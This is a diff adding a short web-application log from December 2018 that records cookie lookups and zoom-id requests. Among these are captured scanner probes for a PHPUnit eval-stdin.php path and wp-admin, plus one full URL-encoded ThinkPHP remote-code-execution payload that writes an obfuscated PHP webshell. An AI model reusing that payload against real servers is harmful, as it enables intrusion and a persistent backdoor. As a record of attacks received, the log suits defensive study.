@@ -1,0 +1,20 @@
+2018-12-21 3:15:18 - INFO --> getUserByCookie: 
+2018-12-21 6:00:18 - INFO --> getUserByCookie: 
+2018-12-21 8:50:49 - INFO --> getUserByCookie: 
+2018-12-21 8:50:49 - INFO --> getZoomById: iSctp
+2018-12-21 8:50:49 - INFO --> incrementZoomById: iSctp
+2018-12-21 8:50:49 - INFO --> increment zoom: iSctp
+2018-12-21 9:54:24 - INFO --> getUserByCookie: 
+2018-12-21 9:54:24 - INFO --> getZoomById: fbclid=IwAR0i7c-0TRRRC_mT8Hz2qDTl6qtV-IDSoJ3N9jnQ55UE-wdgwqVg2t5wxd8
+2018-12-21 15:12:05 - INFO --> getUserByCookie: 
+2018-12-21 15:12:05 - INFO --> getZoomById: iSctp
+2018-12-21 15:12:05 - INFO --> incrementZoomById: iSctp
+2018-12-21 15:12:05 - INFO --> increment zoom: iSctp
+2018-12-21 16:54:58 - INFO --> getUserByCookie: 
+2018-12-21 16:54:58 - INFO --> getZoomById: sitemap.xml
+2018-12-21 17:48:50 - INFO --> getUserByCookie: 
+2018-12-21 17:48:50 - INFO --> getZoomById: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2018-12-21 20:18:51 - INFO --> getUserByCookie: 
+2018-12-21 20:18:51 - INFO --> getZoomById: s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=test123.php&vars[1][]=%3C%3Fphp%20print(md5(0x22))%3B%20%24a%20%3D%20str_replace('vbnm'%2C''%2C'asvbnmsert')%3B%20%24a(%24_POST%5Bqwer%5D)%3B%3F%3E
+2018-12-21 20:22:44 - INFO --> getUserByCookie: 
+2018-12-21 20:22:44 - INFO --> getZoomById: demo/wp-admin/
